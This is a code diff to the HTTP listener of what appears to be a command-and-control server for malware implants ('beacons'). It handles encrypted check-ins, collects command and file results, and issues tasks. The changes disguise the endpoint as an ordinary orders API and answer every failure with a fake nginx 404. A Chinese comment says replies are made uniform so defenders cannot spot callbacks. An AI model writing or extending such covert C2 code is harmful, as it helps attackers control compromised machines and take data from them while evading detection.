@@ -22,8 +22,8 @@ import (
 )
 
 const (
-	// DefaultPath is the innocuous check-in endpoint path.
-	DefaultPath = "/api/v2/sync"
+	// DefaultPath looks like an ordinary API route. Callers can choose another.
+	DefaultPath = "/api/v1/orders"
 	maxBodyLen  = 4 << 20
 )
 
@@ -97,7 +97,9 @@ func (l *Listener) Stop() error {
 	return l.server.Close()
 }
 
-func (l *Listener) notFound(w http.ResponseWriter) {
+func (l *Listener) notFound(w http.ResponseWriter) { notFound(w) }
+
+func notFound(w http.ResponseWriter) {
 	w.Header().Set("Server", "nginx")
 	w.Header().Set("Content-Type", "text/html")
 	w.WriteHeader(http.StatusNotFound)
@@ -109,55 +111,60 @@ func (l *Listener) handler(w http.ResponseWriter, r *http.Request) {
 		l.notFound(w)
 		return
 	}
+	handleCheckin(w, r, l.store, l.secrets)
+}
+
+func handleCheckin(w http.ResponseWriter, r *http.Request, store *Store, secrets *SecretRegistry) {
 	if r.ContentLength > maxBodyLen {
-		l.notFound(w)
+		notFound(w)
 		return
 	}
 	body, err := io.ReadAll(io.LimitReader(r.Body, maxBodyLen))
 	if err != nil {
-		l.notFound(w)
+		notFound(w)
 		return
 	}
-	plain, matched, nonce, err := openBody(body, l.secrets.Entries())
+	plain, matched, nonce, err := openBody(body, secrets.Entries())
 	if err != nil {
-		l.notFound(w)
+		notFound(w)
 		return
 	}
 	ci, err := parseCheckin(plain)
 	if err != nil {
-		l.notFound(w)
+		notFound(w)
 		return
 	}
 	now := time.Now()
 	skew := now.Sub(time.Unix(int64(ci.TS), 0))
 	if skew > maxClockSkew || skew < -maxClockSkew {
-		l.notFound(w)
+		notFound(w)
 		return
 	}
-	if l.store.Touch(ci.BeaconID, nonce, ci.Info, matched.SecretB64, now) {
-		l.notFound(w) // replay
+	if store.Touch(ci.BeaconID, nonce, ci.Info, matched.SecretB64, now) {
+		notFound(w) // replay
 		return
 	}
-	l.store.PushResults(ci.BeaconID, ci.Execs, ci.Files, now)
-	tasks := l.store.TakeTasks(ci.BeaconID)
+	store.PushResults(ci.BeaconID, ci.Execs, ci.Files, now)
+	tasks := store.TakeTasks(ci.BeaconID)
 	for _, task := range tasks {
 		if task.Type == TaskExit {
-			defer l.store.Delete(ci.BeaconID)
+			defer store.Delete(ci.BeaconID)
 		}
 		// sleep 任务落到服务端基准值：空闲窗口结束后 0x44 提示自动回到它
 		if task.Type == TaskSleep {
-			l.store.SetBaseInterval(ci.BeaconID, task.IntervalSec)
+			store.SetBaseInterval(ci.BeaconID, task.IntervalSec)
 		}
 	}
 	payload, err := buildTaskPayload(tasks, 0)
 	if err != nil {
-		l.notFound(w)
+		notFound(w)
 		return
 	}
-	payload = buildCheckinResponse(payload, l.store.NextInterval(ci.BeaconID), 1+int(randomBytes(1)[0]))
+	sec, exact := store.IntervalHint(ci.BeaconID)
+	payload = buildCheckinResponse(payload, sec, exact, 1+int(randomBytes(1)[0]))
 	respBody, err := sealBody(matched.KeyName, deriveKey(mustSecretBytes(matched.SecretB64)), payload)
 	if err != nil {
-		l.notFound(w)
+		notFound(w)
 		return
 	}
 	w.Header().Set("Server", "nginx") // 200 与 404 走同一应答头外观，避免被解密者区分回连
